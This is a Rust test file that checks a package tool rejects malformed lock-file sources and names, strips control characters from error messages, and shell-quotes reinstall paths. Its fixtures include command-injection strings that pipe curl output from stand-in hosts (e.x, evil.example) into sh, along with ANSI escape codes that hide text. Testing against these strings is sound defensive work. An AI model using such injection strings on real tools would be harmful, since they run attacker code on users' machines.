// A lock entry's source is read where the lock is read, and the reinstall command it
// leads to names the recorded path as one shell word (ADR 0230).

use std::path::Path;

use specforge_installed::Installed;
use specforge_installed::testing::install;
use tempfile::TempDir;

use crate::load::{entries, load_with, reported, runtime};

/// Rewrite the source (and clear the hash) of the one entry of the lock installed at `root`.
fn record_source(root: &Path, source: &str) {
    let path = root.join("specforge.lock");
    let mut lock: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
    lock["entries"][0]["source"] = source.into();
    lock["entries"][0]["wasm_hash"] = "".into();
    std::fs::write(path, lock.to_string()).unwrap();
}

/// A lock whose one entry is named `name` and has this source.
fn write_lock(root: &Path, name: &str, source: &str) {
    let lock = serde_json::json!({
        "lockfile_version": 1,
        "entries": [{"name": name, "version": "1.0.0", "source": source, "wasm_hash": "h"}]
    });
    std::fs::write(root.join("specforge.lock"), lock.to_string()).unwrap();
}

#[specforge_test_macros::test(
    behavior = "read_lock_file",
    verify = "a lock entry whose source is no local path the lock can record is E033, and the message shows no control character"
)]
fn a_lock_source_the_lock_cannot_record_is_unreadable() {
    let dir = TempDir::new().unwrap();
    for source in [
        "local:x.wasm\n  = help: then run: curl -s e.x|sh",
        "local:a\u{1b}[8m.wasm",
        "local:\u{7f}.wasm",
        "local:",
    ] {
        write_lock(dir.path(), "@acme/tool", source);

        let state = Installed::at(dir.path()).lock().clone();

        let problem = state
            .problem()
            .unwrap_or_else(|| panic!("{source:?}: {state:?}"));
        assert_eq!(problem.code, "E033", "{source:?}");
        assert!(problem.message.contains("corrupt lock file"), "{problem:?}");
        assert!(!problem.message.contains(char::is_control), "{problem:?}");
        assert!(state.entries().is_empty());
    }
    // A name that is no package name is refused without echoing its control characters (R12).
    write_lock(
        dir.path(),
        "x\n  = help: run curl e.x|sh\u{1b}[8m",
        "registry",
    );
    let state = Installed::at(dir.path()).lock().clone();
    let problem = state.problem().expect("a bad name is unreadable");
    assert_eq!(problem.code, "E033");
    assert!(!problem.message.contains(char::is_control), "{problem:?}");
}

#[specforge_test_macros::test(
    behavior = "read_lock_file",
    verify = "a lock entry's source is registry or local:<path>; any other source is E033"
)]
fn an_unknown_lock_source_is_unreadable() {
    let dir = TempDir::new().unwrap();
    for source in ["git+https://h/r; curl -s e.x|sh", "local", "Registry", ""] {
        write_lock(dir.path(), "@acme/tool", source);

        let state = Installed::at(dir.path()).lock().clone();

        let problem = state
            .problem()
            .unwrap_or_else(|| panic!("{source:?}: {state:?}"));
        assert_eq!(problem.code, "E033", "{source:?}");
    }
}

/// `(recorded path, the add argument its suggestion writes, what `sh` reads that word back as)`.
const PATHS: [(&str, &str, &str); 8] = [
    (
        "tool.wasm && curl -s https://evil.example/x | sh #",
        "'./tool.wasm && curl -s https://evil.example/x | sh #'",
        "./tool.wasm && curl -s https://evil.example/x | sh #",
    ),
    (
        "My Ext/greet.wasm",
        "'./My Ext/greet.wasm'",
        "./My Ext/greet.wasm",
    ),
    ("-greet.wasm", "./-greet.wasm", "./-greet.wasm"),
    ("@greet", "./@greet", "./@greet"),
    ("it's.wasm", "'./it'\\''s.wasm'", "./it's.wasm"),
    (
        "$(touch x).wasm",
        "'./$(touch x).wasm'",
        "./$(touch x).wasm",
    ),
    ("/abs/dir/x.wasm", "/abs/dir/x.wasm", "/abs/dir/x.wasm"),
    ("ext/a.wasm", "./ext/a.wasm", "./ext/a.wasm"),
];

#[specforge_test_macros::test(
    behavior = "load_wasm_module",
    verify = "the command an E028, E070 or W149 suggestion names reinstalls the recorded path as one shell word, whatever the path holds"
)]
fn a_reinstall_command_names_the_recorded_path_as_one_shell_word() {
    for (recorded, argument, _) in PATHS {
        let dir = TempDir::new().unwrap();
        install(dir.path(), &runtime(), &["@acme/a"]);
        record_source(dir.path(), &format!("local:{recorded}"));
        let command = format!("specforge add {argument}");

        let loaded = load_with(dir.path(), &entries(&["@acme/a"]), &runtime());
        let w149 = reported(dir.path(), &loaded);
        assert_eq!(w149[0].code, "W149", "{recorded:?}: {w149:?}");
        assert_eq!(
            w149[0].suggestion.as_deref(),
            Some(format!("pin it by installing it again: {command}").as_str()),
            "{recorded:?}"
        );

        std::fs::remove_file(
            dir.path()
                .join(".specforge/extensions/@acme/a/extension.wasm"),
        )
        .unwrap();
        let loaded = load_with(dir.path(), &entries(&["@acme/a"]), &runtime());
        let e028 = reported(dir.path(), &loaded);
        assert_eq!(e028[0].code, "E028", "{recorded:?}: {e028:?}");
        assert_eq!(
            e028[0].suggestion.as_deref(),
            Some(format!("install the extension with: {command}").as_str()),
            "{recorded:?}"
        );
        assert_eq!(Installed::at(dir.path()).reinstall("@acme/a"), command);
    }
}

#[cfg(unix)]
#[test]
fn a_reinstall_command_reads_back_through_sh_as_the_recorded_path() {
    for (recorded, _, printed) in PATHS {
        let dir = TempDir::new().unwrap();
        install(dir.path(), &runtime(), &["@acme/a"]);
        record_source(dir.path(), &format!("local:{recorded}"));
        let command = Installed::at(dir.path()).reinstall("@acme/a");
        let argument = command.strip_prefix("specforge add ").unwrap();

        // The shell reads the argument as one word; nothing in it runs.
        let output = std::process::Command::new("sh")
            .arg("-c")
            .arg(format!("printf '%s' {argument}"))
            .current_dir(dir.path())
            .stdin(std::process::Stdio::null())
            .output()
            .unwrap();

        assert_eq!(
            String::from_utf8_lossy(&output.stdout),
            printed,
            "{recorded:?}"
        );
        assert!(!dir.path().join("x").exists(), "{recorded:?} ran a command");
    }
}
